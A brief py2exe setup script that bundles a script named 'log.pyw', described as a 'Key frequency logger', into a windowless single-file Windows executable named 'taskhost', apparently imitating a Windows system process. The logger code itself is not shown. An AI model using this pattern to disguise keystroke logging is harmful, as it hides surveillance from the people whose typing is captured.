from distutils.core import setup
import py2exe, sys, os
sys.argv.append('py2exe')
setup(
    name = 'taskhost',
    description = 'Key frequency logger',
    options = {'py2exe': {'bundle_files': 1, 'compressed': True}},
    windows = [{'script': "log.pyw"}],
    zipfile = None,
)
